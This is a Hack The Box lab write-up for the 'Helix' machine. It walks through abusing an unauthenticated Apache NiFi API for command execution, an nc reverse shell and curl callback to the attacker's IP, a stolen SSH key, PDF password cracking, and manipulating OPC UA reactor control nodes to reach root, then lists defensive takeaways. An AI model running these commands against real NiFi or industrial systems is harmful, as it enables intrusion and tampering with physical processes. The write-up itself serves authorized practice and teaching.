# HTB - Helix

![Difficulty](https://img.shields.io/badge/Difficulty-Medium-orange)
![OS](https://img.shields.io/badge/OS-Linux-blue)
![Platform](https://img.shields.io/badge/Platform-Hack%20The%20Box-red)

> **Disclaimer:** This write-up was created for educational purposes and authorized Hack The Box practice environments only.

---

## Table of Contents

* [Overview](#overview)
* [Reconnaissance](#reconnaissance)
* [Virtual Host Discovery](#virtual-host-discovery)
* [Apache NiFi Enumeration](#apache-nifi-enumeration)
* [Unauthenticated RCE via Apache NiFi](#unauthenticated-rce-via-apache-nifi)
* [Initial Access](#initial-access)
* [Lateral Movement to Operator](#lateral-movement-to-operator)
* [User Flag](#user-flag)
* [Privilege Escalation Enumeration](#privilege-escalation-enumeration)
* [ICS and OPC UA Analysis](#ics-and-opc-ua-analysis)
* [Accessing the Internal OPC UA Service](#accessing-the-internal-opc-ua-service)
* [Triggering the Maintenance Window](#triggering-the-maintenance-window)
* [Root](#root)
* [Attack Chain Summary](#attack-chain-summary)
* [Key Takeaways](#key-takeaways)

---

# Overview

Helix is a medium-difficulty Linux machine involving Apache NiFi, unauthenticated command execution, lateral movement through an exposed SSH private key, and an industrial control system based on OPC UA.

The initial attack surface is relatively small. After discovering the `flow.helix.htb` virtual host, Apache NiFi 1.21.0 was identified with anonymous access enabled. This allowed the creation and execution of an `ExecuteProcess` processor through the NiFi REST API.

The initial shell was obtained as the `nifi` service account. Further enumeration revealed a backup of the `operator` user's SSH private key inside the NiFi installation directory, allowing lateral movement.

As `operator`, a password-protected PDF and a PNG containing embedded data provided information about the internal OPC UA industrial control system. After creating an SSH tunnel to the internal OPC UA service, writable reactor control nodes could be manipulated to trigger a maintenance window.

Finally, the maintenance window allowed the execution of a privileged maintenance console, resulting in root access.

### Attack Chain

```text
Nmap
  ↓
Virtual Host Discovery
  ↓
flow.helix.htb
  ↓
Apache NiFi 1.21.0
  ↓
Anonymous API Access
  ↓
ExecuteProcess RCE
  ↓
Reverse Shell as nifi
  ↓
SSH Private Key in NiFi Support Bundles
  ↓
SSH as operator
  ↓
PDF Password Cracking + PNG Analysis
  ↓
OPC UA Node Enumeration
  ↓
SSH Tunnel to Port 4840
  ↓
Manipulate Reactor Control Nodes
  ↓
Maintenance Window
  ↓
Privileged Maintenance Console
  ↓
Root
```

---

# Reconnaissance

## Nmap

I started with a full TCP port scan and service enumeration.

```bash
nmap -sC -sV -p- <TARGET_IP>
```
<img width="956" height="293" alt="01-nmap-helix" src="https://github.com/user-attachments/assets/b77c2aa4-8811-4e19-8e7b-a2934144ca0e" />

The scan revealed:

```text
22/tcp   open   ssh
80/tcp   open   http
```

The external attack surface was limited to SSH and HTTP.

---

# Virtual Host Discovery

The main website was mostly static, so I tested possible virtual hosts.

The discovered hostnames were:

```text
helix.htb
flow.helix.htb
```

I added them to `/etc/hosts`:

```bash
sudo nano /etc/hosts
```

```text
<TARGET_IP> helix.htb flow.helix.htb
```

The `flow.helix.htb` virtual host exposed an Apache NiFi instance.

---

# Apache NiFi Enumeration

I first checked the NiFi API:

```bash
curl -s http://flow.helix.htb/nifi-api/access/config
```

The response indicated that login was not supported:

```json
{
  "config": {
    "supportsLogin": false
  }
}
```

This indicated that the NiFi instance was accessible without authentication.

I also checked the NiFi version:

```bash
curl -s http://flow.helix.htb/nifi-api/flow/about | jq
```

The relevant information was:

```text
Apache NiFi 1.21.0
```

This was a critical finding because the NiFi REST API allowed unauthenticated users to interact with process groups and processors.

---

# Unauthenticated RCE via Apache NiFi

The key functionality was the ability to create an `ExecuteProcess` processor through the API.

The first step was retrieving the root process group ID:

```bash
curl -s http://flow.helix.htb/nifi-api/process-groups/root | jq
```

The response contained the process group ID.

This ID is required when creating a new processor.

---

## Creating an ExecuteProcess Processor

I created a new `ExecuteProcess` processor:

```bash
curl -X POST \
http://flow.helix.htb/nifi-api/process-groups/<PROCESS_GROUP_ID>/processors \
-H "Content-Type: application/json" \
-d '{
  "revision": {
    "version": 0
  },
  "component": {
    "type": "org.apache.nifi.processors.standard.ExecuteProcess",
    "name": "rce-test"
  }
}'
```

The API returned a processor ID.

The important distinction is:

```text
Process Group ID → Used to create the processor
Processor ID     → Used to configure and execute the processor
```

---

## Understanding Command and Command Arguments

The `ExecuteProcess` processor separates the executable from its arguments.

For example:

```text
Command:
busybox
```

```text
Command Arguments:
"nc 10.10.14.24 4444 -e /bin/sh"
```

The resulting process is conceptually:

```bash
busybox "nc 10.10.14.155 4444 -e /bin/sh"
```

This distinction is important because the `Command` field should contain the executable itself, while `Command Arguments` contains its arguments.

---

## Verifying Remote Code Execution

Before attempting a reverse shell, I verified command execution using an HTTP callback.

On Kali:

```bash
python3 -m http.server 8000
```

The processor was configured to execute:

```text
Command:
curl
```

```text
Command Arguments:
http://10.10.14.155:8000/test
```

After starting the processor, the HTTP server received a request from the target:

```text
GET /test HTTP/1.1
```

This confirmed remote command execution.

---

# Initial Access

After confirming RCE, I used the available `nc` binary to obtain a reverse shell.

On Kali:

```bash
nc -lvnp 4444
```

The processor was configured with:

```text
Command:
nc
```

```text
Command Arguments:
10.10.14.155 4444 -e /bin/sh
```

The target connected back to the listener.

I obtained a shell as:

```text
nifi
```

The initial access was therefore:

```text
Unauthenticated NiFi API
        ↓
ExecuteProcess
        ↓
Arbitrary OS Command Execution
        ↓
Reverse Shell
        ↓
nifi
```

---

# Lateral Movement to Operator

After obtaining the shell as `nifi`, I started enumerating the filesystem and the NiFi installation.

The NiFi installation directory contained a support-bundles directory:

```bash
ls -la /opt/nifi-1.21.0/support-bundles/
```

Among the files was a backup of an SSH private key:

```text
operator_id_ed25519.bak
```

I read the key:

```bash
cat /opt/nifi-1.21.0/support-bundles/operator_id_ed25519.bak
```

The key was copied to my attacking machine and its permissions were restricted:

```bash
chmod 600 operator_key
```

I then connected via SSH:

```bash
ssh -i operator_key operator@helix.htb
```

This resulted in access as:

```text
operator
```

---

# User Flag

Once logged in as `operator`, the user flag was located in the user's home directory.

```bash
cat /home/operator/user.txt
```

---

# Privilege Escalation Enumeration

I checked the available sudo permissions:

```bash
sudo -l
```

The result showed that the user could execute:

```text
/usr/local/sbin/helix-maint-console
```

without a password.

However, executing the script directly did not immediately provide root access.

I inspected the script:

```bash
cat /usr/local/sbin/helix-maint-console
```

The important logic required a file:

```text
/opt/helix/state/maintenance_window
```

The script checked whether the file existed and contained a future Unix timestamp.

Therefore, the privilege escalation condition was:

```text
maintenance_window exists
        +
timestamp is still valid
        ↓
helix-maint-console
        ↓
root shell
```

The main question became:

> How can the maintenance window be created?

---

# ICS and OPC UA Analysis

The `operator` home directory contained several files related to the industrial control system.

One of the most important files was a password-protected PDF.

The PDF was processed using John the Ripper.

First, I extracted the password hash:

```bash
perl /usr/share/john/pdf2john.pl \
"Operator Control & Safety Guide.pdf" > pdf_hash.txt
```

Then I cracked the password:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt pdf_hash.txt
```

The password was recovered. (operator1)

The PDF contained information about the reactor control system and the conditions required to trigger a maintenance window.

The relevant information was:

```text
Maintenance temperature threshold: approximately 295°C
```

The PDF also indicated that the reactor could be placed into a maintenance/testing state using specific control parameters.

---

# PNG Analysis

Another important file was a PNG containing information about the control system.

I analyzed it with:

```bash
binwalk -e "control systems diagram.png"
```

The image contained embedded data.

The extracted content revealed information about the OPC UA architecture and the available node IDs.

The important writable nodes included:

```text
CalibrationOffset
Mode
TestOverride
```

The OPC UA service was running internally:

```text
opc.tcp://127.0.0.1:4840/helix/
```

Because the service was bound to localhost, it was not directly accessible from Kali.

---

# Accessing the Internal OPC UA Service

I created an SSH local port forward:

```bash
ssh -N \
-L 4840:127.0.0.1:4840 \
-i operator_key \
operator@helix.htb
```

This forwarded:

```text
Kali:4840
        ↓
SSH Tunnel
        ↓
Target:127.0.0.1:4840
```

The OPC UA service could now be accessed locally from Kali.

---

## Enumerating Reactor Values

Using the OPC UA Python library, I connected to the service:

```python
from opcua import Client

client = Client("opc.tcp://127.0.0.1:4840/helix/")
client.connect()
```

The important nodes were then queried.

The baseline reactor state showed that the temperature was below the maintenance threshold.

The objective was to manipulate the writable nodes discovered during the previous analysis.

---

# Triggering the Maintenance Window

The maintenance condition required modifying the reactor state.

The relevant changes were:

```text
Mode              → MAINTENANCE
TestOverride      → True
CalibrationOffset → 11.0
```

The calibration offset increased the effective reactor temperature until the maintenance threshold was reached.

The general logic was:

```text
MAINTENANCE mode
        +
TestOverride enabled
        +
CalibrationOffset increased
        ↓
Temperature reaches maintenance threshold
        ↓
Safety controller detects condition
        ↓
maintenance_window file created
```

Once the maintenance window was created, I verified the file:

```bash
cat /opt/helix/state/maintenance_window
```

The file contained a future Unix timestamp.

---

# Root

With the maintenance window active, I executed the allowed maintenance console:

```bash
sudo /usr/local/sbin/helix-maint-console
```

The maintenance authorization check succeeded and the privileged maintenance shell was spawned.

I obtained root access:

```text
root@helix
```

The root flag was located at:

```bash
cat /root/root.txt
```

---

# Attack Chain Summary

```text
1. Nmap
   ↓
2. Discover helix.htb and flow.helix.htb
   ↓
3. Identify Apache NiFi 1.21.0
   ↓
4. Confirm anonymous access
   ↓
5. Retrieve the process group ID
   ↓
6. Create an ExecuteProcess processor
   ↓
7. Configure Command and Command Arguments
   ↓
8. Verify RCE with an HTTP callback
   ↓
9. Obtain a reverse shell as nifi
   ↓
10. Find operator SSH private key backup
   ↓
11. SSH as operator
   ↓
12. Crack the protected PDF
   ↓
13. Analyze the PNG with binwalk
   ↓
14. Discover OPC UA node IDs
   ↓
15. Create an SSH tunnel to port 4840
   ↓
16. Modify reactor control values
   ↓
17. Trigger maintenance_window
   ↓
18. Execute helix-maint-console with sudo
   ↓
19. Obtain root
```

---

# Key Takeaways

## 1. Anonymous Apache NiFi Access Can Lead to RCE

Apache NiFi should never expose an unauthenticated API capable of creating and executing processors.

The critical chain was:

```text
Anonymous API Access
        ↓
Create ExecuteProcess Processor
        ↓
Execute Arbitrary Commands
```

---

## 2. Service Accounts Should Not Have Access to Private Keys

The `nifi` service account was able to read a backup of the `operator` user's SSH private key.

This created a direct lateral movement path:

```text
nifi
 ↓
Read SSH Private Key
 ↓
operator
```

Private keys should never be stored in directories accessible to application service accounts.

---

## 3. Sensitive Operational Documents Require Strong Passwords

The password protecting the PDF was weak enough to be recovered using a common wordlist.

Industrial documentation can contain:

* Network architecture
* Control logic
* Safety thresholds
* Node identifiers
* Privileged operational procedures

These documents should be protected with strong, randomly generated passwords.

---

## 4. Steganography Does Not Provide Real Security

The PNG contained embedded data that could be extracted using standard forensic tools.

Obscuring sensitive information inside an image is not a replacement for:

* Authentication
* Authorization
* Encryption
* Access controls

---

## 5. OPC UA Interfaces Must Be Properly Secured

The OPC UA service exposed writable control nodes.

Industrial control systems should enforce:

* Strong authentication
* Certificate-based security
* Per-node read/write permissions
* Network segmentation
* Logging and monitoring

---

## 6. File-Based Privilege Checks Must Be Protected

The privileged maintenance console trusted the existence and content of a file as an authorization mechanism.

If an attacker can cause the file to be created or manipulated indirectly, the authorization mechanism can be abused.

Privileged authorization mechanisms should use stronger controls than the existence of an unverified file.

---

## Final Attack Path

```text
flow.helix.htb
      ↓
Apache NiFi Anonymous Access
      ↓
ExecuteProcess RCE
      ↓
nifi
      ↓
operator SSH Private Key
      ↓
operator
      ↓
PDF + PNG Analysis
      ↓
OPC UA
      ↓
Reactor Manipulation
      ↓
Maintenance Window
      ↓
sudo helix-maint-console
      ↓
root
```

---

## Flags

```text
User:  [Obtained]
Root:  [Obtained]
```

---

# Conclusion

Helix combines traditional web enumeration with an industrial control system attack path.

The initial compromise was caused by an unauthenticated Apache NiFi API that allowed arbitrary process execution. After obtaining access as the NiFi service account, an exposed SSH private key enabled lateral movement to the `operator` user.

The final privilege escalation required understanding the industrial control system rather than simply searching for a traditional Linux misconfiguration. By analyzing the operator documentation, extracting hidden information from the PNG, tunneling to the internal OPC UA service, and manipulating the reactor's writable control nodes, the maintenance window could be triggered.

This ultimately enabled the privileged maintenance console and root access.

**Overall attack chain:**

> **Unauthenticated NiFi → RCE → nifi → SSH Key → operator → ICS Analysis → OPC UA Manipulation → Maintenance Window → Root**
